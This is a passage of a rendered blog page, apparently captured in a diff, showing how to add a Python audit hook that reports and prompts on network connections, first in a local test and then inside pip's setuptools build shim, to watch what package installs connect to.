+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#66d9ef">elif</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;socket.connect&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        print(<span style="color:#e6db74">&#34;REQUESTING &#34;</span> <span style="color:#f92672">+</span> event <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">+</span> str(args[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>])<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;:&#34;</span><span style="color:#f92672">+</span>str(args[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>]))
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    data <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;y(es) or n(o): &#34;</span>)    
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;y&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>sys<span style="color:#f92672">.</span>addaudithook(hook)</span></span></code></pre></div>
+Let&rsquo;s test it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># run http sever</span>
+</span></span><span style="display:flex;"><span>$ python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e"># vim test.py</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#f92672">import</span> hook
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://0.0.0.0:8000&#34;</span>)</span></span></code></pre></div>
+Let&rsquo;s run <code>test.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pip install requests
+</span></span><span style="display:flex;"><span>$ python3 test.py
+</span></span><span style="display:flex;"><span>REQUESTING socket.getaddrinfo 0.0.0.0:8000
+</span></span><span style="display:flex;"><span>y<span style="color:#f92672">(</span>es<span style="color:#f92672">)</span> or n<span style="color:#f92672">(</span>o<span style="color:#f92672">)</span>: y
+</span></span><span style="display:flex;"><span>REQUESTING socket.connect 0.0.0.0:8000
+</span></span><span style="display:flex;"><span>y<span style="color:#f92672">(</span>es<span style="color:#f92672">)</span> or n<span style="color:#f92672">(</span>o<span style="color:#f92672">)</span>: y
+</span></span></code></pre></div><p>Your http server should show:</p>
+<pre tabindex="0"><code>127.0.0.1 - - [15/Jun/2023 14:33:56] &#34;GET / HTTP/1.1&#34; 200 -
+</code></pre><p>Try writing <code>n</code> and notice that the server reports no requests.</p>
+<p>Great! Now let&rsquo;s introduce this hook into <code>pip</code>.
+First, let&rsquo;s add the audit hook into the script Python uses to build packages.
+We need to modify the audit hook slightly as the script is run as a subprocess.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1</span><span><span style="color:#75715e"># pip/_internal/utils/setuptools_build.py</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2</span><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3</span><span><span style="color:#f92672">import</span> textwrap
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4</span><span><span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> List, Optional, Sequence
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6</span><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7</span><span>AUDIT_HOOK <span style="color:#f92672">=</span> textwrap<span style="color:#f92672">.</span>dedent(<span style="color:#e6db74">&#34;&#34;&#34;&#39;&#39;&#39;
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8</span><span><span style="color:#e6db74">def hook(event, args):
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9</span><span><span style="color:#e6db74">    if event == &#34;socket.getaddrinfo&#34;:
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10</span><span><span style="color:#e6db74">        sys.stdout.write(&#34;REQUESTING &#34; + event + &#34; &#34;+ str(args[0])+&#34;:&#34;+str(args[1]) + os.linesep)
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11</span><span><span style="color:#e6db74">        sys.stdout.flush()
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12</span><span><span style="color:#e6db74">    elif event == &#34;socket.connect&#34;:
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13</span><span><span style="color:#e6db74">        sys.stdout.write(&#34;REQUESTING &#34; + event + &#34; &#34;+ str(args[1][0])+&#34;:&#34;+str(args[1][1]) + os.linesep)
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14</span><span><span style="color:#e6db74">        sys.stdout.flush()
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15</span><span><span style="color:#e6db74">        # TODO: filter anything in venv
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16</span><span><span style="color:#e6db74">    # we can filter for anything from here
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17</span><span><span style="color:#e6db74">    # https://peps.python.org/pep-0578/#suggested-audit-hook-locations
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18</span><span><span style="color:#e6db74">    else:
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19</span><span><span style="color:#e6db74">        return
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20</span><span><span style="color:#e6db74">    data = input()    
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21</span><span><span style="color:#e6db74">    if data != &#34;y&#34;:
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22</span><span><span style="color:#e6db74">        sys.exit(1)
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23</span><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24</span><span><span style="color:#e6db74">sys.addaudithook(hook)
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25</span><span><span style="color:#e6db74">&#39;&#39;&#39;&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26</span><span><span style="color:#75715e"># Shim to wrap setup.py invocation with setuptools</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27</span><span><span style="color:#75715e"># Note that __file__ is handled via two {!r} *and* %r, to ensure that paths on</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28</span><span><span style="color:#75715e"># Windows are correctly handled (it should be &#34;C:\\Users&#34; not &#34;C:\Users&#34;).</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29</span><span>_SETUPTOOLS_SHIM <span style="color:#f92672">=</span> textwrap<span style="color:#f92672">.</span>dedent(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30</span><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31</span><span><span style="color:#e6db74">    exec(compile(&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32</span><span><span style="color:#e6db74">    # This is &lt;pip-setuptools-caller&gt; -- a caller that pip uses to run setup.py
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33</span><span><span style="color:#e6db74">    #
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34</span><span><span style="color:#e6db74">    # - It imports setuptools before invoking setup.py, to enable projects that directly
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35</span><span><span style="color:#e6db74">    #   import from `distutils.core` to work with newer packaging standards.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36</span><span><span style="color:#e6db74">    # - It provides a clear error message when setuptools is not installed.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37</span><span><span style="color:#e6db74">    # - It sets `sys.argv[0]` to the underlying `setup.py`, when invoking `setup.py` so
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38</span><span><span style="color:#e6db74">    #   setuptools doesn&#39;t think the script is `-c`. This avoids the following warning:
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39</span><span><span style="color:#e6db74">    #     manifest_maker: standard file &#39;-c&#39; not found&#34;.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40</span><span><span style="color:#e6db74">    # - It generates a shim setup.py, for handling setup.cfg-only projects.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41</span><span><span style="color:#e6db74">    import os, sys, tokenize
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42</span><span><span style="color:#e6db74">    try:
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43</span><span><span style="color:#e6db74">        import setuptools
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44</span><span><span style="color:#e6db74">    except ImportError as error:
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45</span><span><span style="color:#e6db74">        print(
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46</span><span><span style="color:#e6db74">            &#34;ERROR: Can not execute `setup.py` since setuptools is not available in &#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47</span><span><span style="color:#e6db74">            &#34;the build environment.&#34;,
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48</span><span><span style="color:#e6db74">            file=sys.stderr,
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49</span><span><span style="color:#e6db74">        )
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50</span><span><span style="color:#e6db74">        sys.exit(1)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51</span><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52</span><span><span style="color:#e6db74">    __file__ = </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53</span><span><span style="color:#e6db74">    sys.argv[0] = __file__
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54</span><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55</span><span><span style="color:#e6db74">    if os.path.exists(__file__):
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56</span><span><span style="color:#e6db74">        filename = __file__
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57</span><span><span style="color:#e6db74">        with tokenize.open(__file__) as f:
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58</span><span><span style="color:#e6db74">            setup_py_code = f.read()
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59</span><span><span style="color:#e6db74">    else:
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60</span><span><span style="color:#e6db74">        filename = &#34;&lt;auto-generated setuptools caller&gt;&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61</span><span><span style="color:#e6db74">        setup_py_code = &#34;from setuptools import setup; setup()&#34;
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62</span><span><span style="color:#e6db74">    # setup audit hooks here
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63</span><span><span style="color:#e6db74">    </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64</span><span><span style="color:#e6db74">    exec(compile(setup_py_code, filename, &#34;exec&#34;))
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65</span><span><span style="color:#e6db74">    &#39;&#39;&#39; % (</span><span style="color:#e6db74">{!r}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">), &#34;&lt;pip-setuptools-caller&gt;&#34;, &#34;exec&#34;))
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66</span><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67</span><span>)<span style="color:#f92672">.</span>rstrip()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_setuptools_shim_args</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71</span><span>    setup_py_path: str,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72</span><span>    global_options: Optional[Sequence[str]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73</span><span>    no_user_config: bool <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74</span><span>    unbuffered_output: bool <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75</span><span>) <span style="color:#f92672">-&gt;</span> List[str]:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76</span><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77</span><span><span style="color:#e6db74">    Get setuptools command arguments with shim wrapped setup file invocation.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78</span><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79</span><span><span style="color:#e6db74">    :param setup_py_path: The path to setup.py to be wrapped.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80</span><span><span style="color:#e6db74">    :param global_options: Additional global options.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81</span><span><span style="color:#e6db74">    :param no_user_config: If True, disables personal user configuration.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82</span><span><span style="color:#e6db74">    :param unbuffered_output: If True, adds the unbuffered switch to the
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83</span><span><span style="color:#e6db74">     argument list.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84</span><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85</span><span>    args <span style="color:#f92672">=</span> [sys<span style="color:#f92672">.</span>executable]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86</span><span>    <span style="color:#66d9ef">if</span> unbuffered_output:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87</span><span>        args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;-u&#34;</span>]
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88</span><span>    args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;-c&#34;</span>, _SETUPTOOLS_SHIM<span style="color:#f92672">.</span>format(setup_py_path, AUDIT_HOOK)]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89</span><span>    <span style="color:#66d9ef">if</span> global_options:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90</span><span>        args <span style="color:#f92672">+=</span> global_options
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91</span><span>    <span style="color:#66d9ef">if</span> no_user_config:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92</span><span>        args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;--no-user-cfg&#34;</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93</span><span>    <span style="color:#66d9ef">return</span> args
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_setuptools_bdist_wheel_args</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97</span><span>    setup_py_path: str,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98</span><span>    global_options: Sequence[str],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99</span><span>    build_options: Sequence[str],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100</span><span>    destination_dir: str,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101</span><span>) <span style="color:#f92672">-&gt;</span> List[str]:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102</span><span>    <span style="color:#75715e"># NOTE: Eventually, we&#39;d want to also -S to the flags here, when we&#39;re</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103</span><span>    <span style="color:#75715e"># isolating. Currently, it breaks Python in virtualenvs, because it</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104</span><span>    <span style="color:#75715e"># relies on site.py to find parts of the standard library outside the</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105</span><span>    <span style="color:#75715e"># virtualenv.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106</span><span>    args <span style="color:#f92672">=</span> make_setuptools_shim_args(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107</span><span>        setup_py_path, global_options<span style="color:#f92672">=</span>global_options, unbuffered_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108</span><span>    )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109</span><span>    args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;bdist_wheel&#34;</span>, <span style="color:#e6db74">&#34;-d&#34;</span>, destination_dir]
